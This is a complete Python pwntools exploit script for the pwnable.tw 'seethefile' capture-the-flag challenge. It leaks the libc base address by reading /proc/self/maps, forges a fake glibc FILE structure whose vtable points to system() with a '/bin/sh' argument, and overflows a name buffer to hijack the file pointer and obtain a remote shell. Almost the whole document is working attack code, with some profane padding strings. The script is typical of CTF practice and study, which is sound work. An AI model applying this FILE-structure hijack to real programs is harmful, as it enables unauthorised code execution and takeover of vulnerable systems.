#!/usr/bin/env python2
from pwn import *
context(arch = 'i386', os = 'linux')

ready = True
if ready:
    conn = connect('chall.pwnable.tw', 10200)
else:
    conn = process(['/home/doublesine/Desktop/seethefile'],
                   env = { 'LD_LIBRARY_PATH' : '/home/doublesine/Desktop'})

def connRead():
    sleep(0.5)
    read = conn.read()
    print read,
    return read

def connSendRaw(s):
    conn.send_raw(s)
    print s,

name_addr = 0x0804B260
fp_addr = 0x0804B280
libc_system_addr = 0x0003A940

# open '/proc/self/maps'
connRead()
connSendRaw('1\n')
connRead()
connSendRaw('/proc/self/maps\n')

# read
connRead()
connSendRaw('2\n')  # read file
connRead()
connSendRaw('2\n')  # read file
connRead()
connSendRaw('3\n')  # write file to screen

read = connRead()
reads = read.split('\n')
libc_base_addr = 0
for i in range(0, len(reads)):
    if reads[i].endswith('.so'):
        libc_base_addr = int(reads[i][0:8], 16)
        break
if libc_base_addr == 0:
    print('[*] Failed to get libc base addr')
    conn.close()
    exit(0)
libc_system_addr += libc_base_addr
print('[*] libc_base_addr = 0x%08x' % libc_base_addr)
print('[*] libc_system_addr = 0x%08x' % libc_system_addr)

# FILE.flags            (+0)    = 0xAAAA8AAA    cannot have 0x2000, must have 0x8000
# FILE._IO_read_ptr     (+4)    = '||/b'
# FILE._IO_read_end     (+8)    = 'in/s'
# FILE._IO_read_base    (+12)   = 'h\x00\x00\x00'
# FILE._IO_write_base   (+16)   = 'fuck'
# FILE._IO_write_ptr    (+20)   = 'fuck'
# FILE._IO_write_end    (+24)   = 'fuck'
# FILE._IO_buf_base     (+28)   = 'fuck'
# FILE._IO_buf_end      (+32)   = 'fuck'
# FILE._IO_save_base    (+36)   = 'fuck'
# FILE._IO_backup_base  (+40)   = 'fuck'
# FILE._IO_save_end     (+44)   = 'fuck'
# FILE._markers         (+48)   = 'fuck'
# FILE._chain           (+52)   = 'fuck'
# FILE._fileno          (+56)   = 'fuck'
# FILE._flags2          (+60)   = 'fuck'
# FILE._old_offset      (+64)   = 'fuck'
# FILE._cur_column      (+68)   = 'fu'
# FILE._vtable_offset   (+70)   = 'c'
# FILE._shortbuf        (+71)   = 'k'
# FILE._lock            (+72)   = 'fuck'
# FILE._offset          (+76)   = name_addr
fake_FILE_object = pack(0xAAAA8AAA, 32) + \
                   '||/b' + \
                   'in/s' + \
                   'h\x00\x00\x00' + \
                   'fuck' * 15 + \
                   pack(name_addr, 32)
name_content = 'fuck' + \
               'fuck' + \
               pack(libc_system_addr, 32) + \
               pack(0, 32) + \
               'fuck' * 4 + \
               pack(fp_addr + 4, 32)    # overlap fp content

connSendRaw('5\n')  # exit and overflow name
connRead()
connSendRaw(name_content + fake_FILE_object + '\n')

# you will get shell here
# run '/home/seethefile/get_flag' and type 'Give me the flag' to get flag
conn.interactive()
conn.close()
